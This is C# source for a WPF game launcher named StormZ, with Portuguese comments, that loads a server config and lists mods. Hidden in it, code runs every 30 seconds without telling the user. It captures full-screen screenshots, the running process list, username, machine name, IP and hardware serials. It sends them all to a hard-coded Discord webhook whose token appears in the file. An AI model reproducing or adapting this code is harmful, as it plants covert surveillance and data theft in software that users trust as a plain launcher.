using System;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;
using System.Windows.Threading;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Text.Json;
using NodaTime;
using MessageBox = System.Windows.MessageBox;
using Application = System.Windows.Application;
using System.Diagnostics;

namespace StormZ {
    public partial class MainWindow : Window {

        // Pasta onde os mods estão localizados

        string pastamods = "Mods";
        private DispatcherTimer timer;
        string nickName = File.Exists("nick.txt") ? File.ReadAllText("nick.txt").Trim() : "Sem nick";



        public MainWindow() {

            // Inicializa o componente e as configurações

            InitializeComponent();
            _ = InicializarConfiguracoes();

            string arqn = "nick.txt";
            if (File.Exists(arqn))
                txtnick.Text = File.ReadAllText(arqn).Trim();
            else
                txtnick.Text = "Sem nick";

            IniciarEnvioAutomatico();

            
        }

        public class Config {

            // Propriedades para armazenar as configurações remotas

            public string IpServer { get; set; }
            public string PortServer { get; set; }
            public string Manutencao { get; set; }
        }

        private string IpServer;
        private string PortServer;
        private string Manutencao;

        // Método para obter a configuração remota do GitHub
        public async Task<Config> ObterConfiguracaoRemota() {
            try
            {
                using var httpClient = new HttpClient();
                string url = "https://raw.githubusercontent.com/Mateusdev3/StormZ_Configs/main/config.json";
                var json = await httpClient.GetStringAsync(url);
                return JsonSerializer.Deserialize<Config>(json);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Erro ao obter configuração remota: {ex.Message}");
                return null;
            }
        }

        // Método para inicializar as configurações a partir do arquivo JSON remoto

        private async Task InicializarConfiguracoes() {
            var config = await ObterConfiguracaoRemota();

            if (config == null)
                return;

            IpServer = config.IpServer;
            PortServer = config.PortServer;
            Manutencao = config.Manutencao;
        }

        // Método para iniciar o envio automático de informações e tasklist a cada 30 segundos
        private void IniciarEnvioAutomatico() {
            timer = new DispatcherTimer();
            timer.Interval = TimeSpan.FromSeconds(30);
            timer.Tick += async (s, e) =>
            {
                await EnviarInfosParaWebhook();
                await EnviarTasklistParaWebhook();
            };
            timer.Start();
        }

        // Evento de clique do botão "Jogar" que inicia o jogo e envia as informações para o webhook
        private async void btnJogar_Click(object sender, RoutedEventArgs e) {
            string mods = ObterMods(pastamods);
            await EnviarInfosParaWebhook();
            await EnviarTasklistParaWebhook();
            MessageBox.Show($"Iniciando o jogo com IP: {IpServer}, Porta: {PortServer}, Manutenção: {Manutencao}");
        }

        // Método para obter os mods da pasta especificada e formatar a string para o webhook
        private string ObterMods(string pastamods) {
            if (!Directory.Exists(pastamods))
            {
                MessageBox.Show("Pasta mods não encontrada");
                return string.Empty;
            }

            string[] pastas = Directory.GetDirectories(pastamods);
            return "Mods\\" + string.Join(";Mods\\", pastas.Select(System.IO.Path.GetFileName));
        }

        // Método para enviar as informações do sistema e captura de tela para o webhook do Discord
        private async Task EnviarInfosParaWebhook() {
            try
            {
               
                string pcName = Environment.MachineName;
                string userName = Environment.UserName;
                string sistema = Environment.OSVersion.ToString();
                string ipLocal = Dns.GetHostEntry(Dns.GetHostName())
                    .AddressList.FirstOrDefault(a => a.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)?.ToString();

                string cpu = GetWMIProperty("Win32_Processor", "ProcessorId");
                string hd = GetWMIProperty("Win32_PhysicalMedia", "SerialNumber");
                string gpu = GetWMIProperty("Win32_VideoController", "Name");
                string gpuSerial = GetWMIProperty("Win32_VideoController", "PNPDeviceID");
                string ramSerial = GetWMIProperty("Win32_PhysicalMemory", "SerialNumber");
                string boardSerial = GetWMIProperty("Win32_BaseBoard", "SerialNumber");
                var now = SystemClock.Instance.GetCurrentInstant();
                var zonedDateTime = DateTimeZoneProviders.Tzdb["America/Sao_Paulo"];
                var zonedTime = now.InZone(zonedDateTime);
                string horario = zonedTime.ToString("dd/MM/yyyy HH:mm:ss", null);

                string screenshotPath = CapturarTela();

                using (var client = new HttpClient())
                using (var form = new MultipartFormDataContent())
                {
                    var payload = new
                    {
                        content = $"## {nickName}",
                        embeds = new[]
                        {
                            new
                            {
                                title = "**\ud83d\udcbb PLAYER CONECTANDO!!!**",
                                color = 12648479,
                                fields = new[]
                                {
                                    new { name = "\ud83d\udc64 NICK", value = nickName, inline = false },
                                    new { name = "\ud83d\udcbb COMPUTERID", value = pcName, inline = false },
                                    new { name = "\ud83d\udcf6 IP", value = ipLocal ?? "Desconhecido", inline = false },
                                    new { name = "\ud83e\udde0 CPUID", value = cpu, inline = false },
                                    new { name = "\ud83d\udcc2 HWID", value = hd, inline = false },
                                    new { name = "\ud83c\udfae GPUNAME", value = gpu, inline = false },
                                    new { name = "\ud83d\udcc9 GPUID", value = gpuSerial, inline = false },
                                    new { name = "\ud83d\udccd RAMID", value = ramSerial, inline = false },
                                    new { name = "\ud83d\udcbb BOARDID", value = boardSerial, inline = false },
                                    new { name = "\ud83d\udcbb SISTEM", value = sistema, inline = false },
                                    new {name = " \ud83d\udcdd DATA", value = horario , inline = false },
                                }
                            }
                        }
                    };

                    string jsonPayload = JsonSerializer.Serialize(payload);
                    form.Add(new StringContent(jsonPayload, Encoding.UTF8, "application/json"), "payload_json");

                    if (!string.IsNullOrEmpty(screenshotPath) && File.Exists(screenshotPath))
                    {
                        var imageContent = new ByteArrayContent(File.ReadAllBytes(screenshotPath));
                        imageContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("image/png");
                        form.Add(imageContent, "file", "screenshot.png");
                    }

                    await client.PostAsync("https://discord.com/api/webhooks/1389035649029640334/DhW45FPrDlVXWkUpiougYjPdpHi06PZ4gqjc8qE0FvaFku6jn2q6YUJUKK1Qnye1Gcqa", form);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Erro ao enviar dados: {ex.Message}");
            }
        }
        // Método para enviar a lista de processos ativos (tasklist) para o webhook do Discord
        private async Task EnviarTasklistParaWebhook() {
            try
            {
                string caminhoTasklist = Path.Combine(Path.GetTempPath(), "tasklist.txt");

                var startInfo = new System.Diagnostics.ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = "/c tasklist",
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                using (var process = System.Diagnostics.Process.Start(startInfo))
                {
                    string output = await process.StandardOutput.ReadToEndAsync();
                    await process.WaitForExitAsync();
                    File.WriteAllText(caminhoTasklist, output);
                }

                using (var client = new HttpClient())
                using (var form = new MultipartFormDataContent())
                {
                    form.Add(new StringContent($"## \ud83d\udcc4 {nickName}"), "content");

                    if (File.Exists(caminhoTasklist))
                    {
                        var tasklistContent = new ByteArrayContent(File.ReadAllBytes(caminhoTasklist));
                        tasklistContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("text/plain");
                        form.Add(tasklistContent, "file", "tasklist.txt");
                    }

                    await client.PostAsync("https://discord.com/api/webhooks/1389035649029640334/DhW45FPrDlVXWkUpiougYjPdpHi06PZ4gqjc8qE0FvaFku6jn2q6YUJUKK1Qnye1Gcqa", form);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Erro ao enviar tasklist: {ex.Message}");
            }
        }

        // Método para capturar a tela e salvar como imagem PNG
        private string CapturarTela() {
            try
            {
                var allScreens = System.Windows.Forms.Screen.AllScreens;
                int larguraTotal = allScreens.Sum(screen => screen.Bounds.Width);
                int alturaMaxima = allScreens.Max(screen => screen.Bounds.Height);

                using (var bitmap = new System.Drawing.Bitmap(larguraTotal, alturaMaxima))
                {
                    using (var g = System.Drawing.Graphics.FromImage(bitmap))
                    {
                        int offsetX = 0;
                        foreach (var screen in allScreens)
                        {
                            g.CopyFromScreen(screen.Bounds.X, screen.Bounds.Y, offsetX, 0, screen.Bounds.Size);
                            offsetX += screen.Bounds.Width;
                        }
                    }

                    string caminho = Path.Combine(Path.GetTempPath(), "screenshot.png");
                    bitmap.Save(caminho, System.Drawing.Imaging.ImageFormat.Png);
                    Debug.WriteLine($"Captura de tela salva em: {caminho}");
                    return caminho;
                }
            }
            catch (Exception)
            {
                return null;
            }
        }

        // Método para obter uma propriedade WMI de um objeto específico
        private string GetWMIProperty(string className, string propertyName) {
            try
            {
                using (var searcher = new ManagementObjectSearcher($"SELECT {propertyName} FROM {className}"))
                {
                    foreach (var obj in searcher.Get())
                    {
                        return obj[propertyName]?.ToString().Trim();
                    }
                }
            }
            catch { }

            return "Desconhecido";
        }

        private void Minimize_Click(object sender, RoutedEventArgs e) => this.WindowState = WindowState.Minimized;

        private void Close_Click(object sender, RoutedEventArgs e) => this.Close();

        private void Mouse(object sender, MouseButtonEventArgs e) {
            if (e.LeftButton == MouseButtonState.Pressed)
                this.DragMove();
        }

        private void Abrirdc(object sender, RoutedEventArgs e) => MessageBox.Show("abrindo discord...");

        private void Abrirconfig(object sender, RoutedEventArgs e) => MessageBox.Show("Abrindo config");

        private void btnBaixar_Click(object sender, RoutedEventArgs e) => MessageBox.Show("Baixando arquivos...");

        // Evento de clique do botão para abrir a janela de nome
        private void AbrirJanelaNome_Click(object sender, RoutedEventArgs e) {
            Window1 janelaNome = new Window1();
            if (janelaNome.ShowDialog() == true)
            {
                File.WriteAllText("nick.txt", janelaNome.NomeDigitado);
                txtnick.Text = janelaNome.NomeDigitado;
            }
        }

        // Evento de clique do botão para definir o nick

        private void Nick(object sender, RoutedEventArgs e) {
            Window1 janela = new Window1();
            if (janela.ShowDialog() == true)
            {
                txtnick.Text = janela.NomeDigitado;
            }
        }
    }
}